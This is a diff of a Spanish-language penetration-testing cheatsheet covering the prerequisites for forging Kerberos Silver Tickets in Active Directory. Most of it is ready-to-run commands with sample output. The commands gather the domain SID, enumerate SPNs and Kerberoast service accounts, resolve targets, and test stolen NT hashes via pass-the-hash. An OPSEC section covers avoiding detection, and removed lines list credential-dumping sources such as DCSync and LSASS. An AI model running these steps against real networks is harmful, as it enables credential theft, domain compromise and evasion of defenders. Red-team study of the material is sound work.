@@ -1,7 +1,7 @@
 ---
 aliases:
   - Silver Ticket Prerequisites
-  - Silver Ticket SPNs
+  - Silver Ticket SPN discovery
 tags:
   - type/cheatsheet
   - technique/persistence
@@ -21,70 +21,112 @@ linked:
 
 ***
 
-## Requisitos mínimos
+## Domain SID — recolección
 
-| **Requisito** | **Cómo obtener** | **Cuándo** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| NT hash o AES key del service/computer account | Kerberoast crack / DCSync / LSASS / reg save | Pre-forge. |
-| Domain SID (`S-1-5-21-x-y-z`) | `impacket-lookupsid` / `whoami /user` / BloodHound | Pre-forge. |
-| SPN del servicio objetivo | `impacket-GetUserSPNs` / `setspn -Q */*` / BloodHound | Pre-forge. |
-| FQDN del host target | DNS, `nslookup`, BloodHound | Pre-forge. |
-^st-pre-req
+| `impacket-lookupsid corp.local/user:'pass'@DC 0` | Domain SID via RID 0 | Linux pre-forge. |
+| `impacket-lookupsid corp.local/user:'pass'@DC 0 \| grep -i 'domain sid'` | Solo línea SID | Clean parse. |
+| `impacket-lookupsid -hashes :NT corp/admin@DC 0` | Domain SID via PtH | Sin password. |
+| `whoami /user` | SID del user actual — descartar último RID | On-host Windows. |
+| `Get-DomainSID` (PowerView) | Domain SID | On-host Windows con PV. |
+^st-pre-sid
 
 ```bash
-# Domain SID
-impacket-lookupsid corp.local/user:'pass'@dc01.corp.local 0
-# → S-1-5-21-1234567890-987654321-111222333
-
-# SPNs en el dominio
-impacket-GetUserSPNs corp.local/user:'pass'@dc01.corp.local
+impacket-lookupsid corp.local/user:'P@ssw0rd'@dc01.corp.local 0 | grep -i "domain sid"
+# Domain SID: S-1-5-21-1234567890-987654321-111222333
 ```
 
 ___
 
-## SPN por servicio
+## SPN discovery — qué servicios atacar
 
-| **Servicio** | **SPN** | **Para qué** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| SMB / file share | `cifs/host.corp.local` | dir \\host\c$, psexec |
-| WinRM / HTTP | `http/host.corp.local` | PSRemoting, IIS |
-| MSSQL | `mssqlsvc/host.corp.local:1433` | SQL login Kerberos |
-| LDAP (DCSync sin DA) | `ldap/dc.corp.local` | secretsdump via silver |
-| WMI | `host/host.corp.local` + `rpcss/host.corp.local` | wmiexec |
-| RPC / DCOM | `host/host.corp.local` | dcomexec, COM objects |
-| Scheduled Tasks | `host/host.corp.local` | at/schtasks remoto |
+| `impacket-GetUserSPNs corp.local/user:'pass'@DC` | SPNs registrados en el dominio | Recon SPNs targets. |
+| `impacket-GetUserSPNs corp.local/user:'pass'@DC -request` | SPNs + TGS hashes (Kerberoast) | Atacar service accounts. |
+| `setspn -Q */* -T corp.local` | SPNs del dominio (on-host Windows) | Sin impacket. |
+| `setspn -L 'WEB01$'` | SPNs registrados sobre un computer/user | Targeted enumeration. |
+| `nxc ldap DC -u user -p pass --kerberoasting kerb.txt` | TGS hashes filtrados | netexec one-liner. |
 ^st-pre-spns
 
 ```bash
-# Computer account: SPNs automáticos (cifs/, host/, ldap/ para DCs)
-# Service account: SPNs manuales (mssqlsvc/, http/, etc.)
-impacket-GetUserSPNs corp.local/user:'pass'@dc01.corp.local -request
+impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local
+# ServicePrincipalName    Name        MemberOf
+# MSSQLSvc/sql01:1433     svc_mssql   ...
+# HTTP/web01.corp.local   svc_iis     ...
 ```
 
 ___
 
-## Fuentes del hash
+## FQDN target — resolver host
 
-| **Hash source** | **Cuenta** | **Método** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Kerberoasting + crack | Service account con SPN | `impacket-GetUserSPNs -request` → hashcat |
-| DCSync | Computer account (`HOST$`) | `impacket-secretsdump -just-dc-user 'HOST$'` |
-| LSASS dump | Service account logueada | `sekurlsa::msv` / pypykatz |
-| LSA secrets (reg save) | Computer account local | `impacket-secretsdump LOCAL` de SECURITY/SYSTEM |
-^st-pre-sources
+| `nslookup TARGET` | FQDN del host | Pre-forge SPN. |
+| `nxc smb DC --pass-pol \| grep -i 'domain'` | Nombre del dominio | Si no tenés FQDN. |
+| `nxc smb hosts.txt` | FQDN columnar de cada host | Bulk discovery. |
+| `dig SRV _ldap._tcp.corp.local @DC` | DCs registrados | Discovery DC FQDN. |
+^st-pre-fqdn
+
+```bash
+# Resolver host objetivo
+nxc smb 10.10.10.0/24
+# 10.10.10.5  WEB01    [*] Windows Server 2019 ... (domain:corp.local)
+```
 
 ___
 
-## Diferencia clave con Golden
+## Test de hash antes de forjar
 
-| | **Silver** | **Golden** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Key usada | Service/computer account hash | krbtgt hash |
-| Tipo de ticket | TGS (para servicio específico) | TGT (cualquier servicio) |
-| Scope | 1 servicio en 1 host | Todo el dominio |
-| Interacción DC | Ninguna (TGS validado local) | Sí (genera 4769 en DC) |
-| Ruido | Solo 4624 en target | 4768 + 4769 en DC |
-| Invalidación | Rotation de la service/computer account | Doble rotation de krbtgt |
-^st-pre-vs-golden
+| `impacket-smbclient -hashes :NT corp.local/'WEB01$'@web01.corp.local` | Valida NT hash del computer account | Pre-forge — confirmar hash. |
+| `nxc smb host -u 'WEB01$' -H NTHASH` | PtH check con netexec | Bulk validation. |
+| `impacket-getTGT -hashes :NT corp.local/'WEB01$'` | Pedir TGT real con el hash | Confirma key válida. |
+^st-pre-test
+
+```bash
+# Confirmar hash antes de invertir tiempo en forge
+impacket-smbclient -hashes :ABC123 corp.local/'WEB01$'@web01.corp.local
+# smb: \> ls   ← si funciona, hash válido
+```
+
+___
+
+## Verificar SPN existe en AD
+
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `impacket-GetUserSPNs corp.local/user:'pass'@DC \| grep cifs` | Confirma SPN registrado | Pre-forge. |
+| `setspn -Q cifs/web01.corp.local` | SPN check on-host | Windows. |
+| `Get-DomainComputer web01 \| select serviceprincipalname` | SPNs del computer (PowerView) | On-host Windows. |
+^st-pre-verify
+
+```bash
+# Confirmar SPN antes de forjar
+impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local | grep -i web01
+# HOST/web01.corp.local      WEB01$
+# CIFS/web01.corp.local      WEB01$
+```
+
+___
+
+## OPSEC pre-ataque
+
+| **Check** | **Comando** | **Qué evita** |
+|:---:|:---:|:---:|
+| Encryption types soportados | `nxc smb DC -u user -p pass -M encryption-downgrade` | Forge RC4 en dominio AES-only = detección. |
+| PAC validation activo | `Get-ADDomain \| select PacValidation` (PV) | KDC re-valida PAC → ticket forjado falla. |
+| Computer account rotation policy | `Get-DomainPolicy \| select MaximumPasswordAge` | Hash inválido si rotation reciente. |
+| Tickets activos (cleanup) | `klist purge` / `kerberos::purge` | Collision con tickets existentes. |
+^st-pre-opsec
+
+```bash
+# Pre-attack: confirmar que dominio NO está en AES-only
+nxc ldap DC -u user -p pass --query '(samAccountName=krbtgt)' 'msDS-SupportedEncryptionTypes'
+# 0x18 = AES128+AES256 only → forge AES, NO RC4
+# 0x1C = RC4+AES128+AES256 → RC4 OK
+```
 
 ***
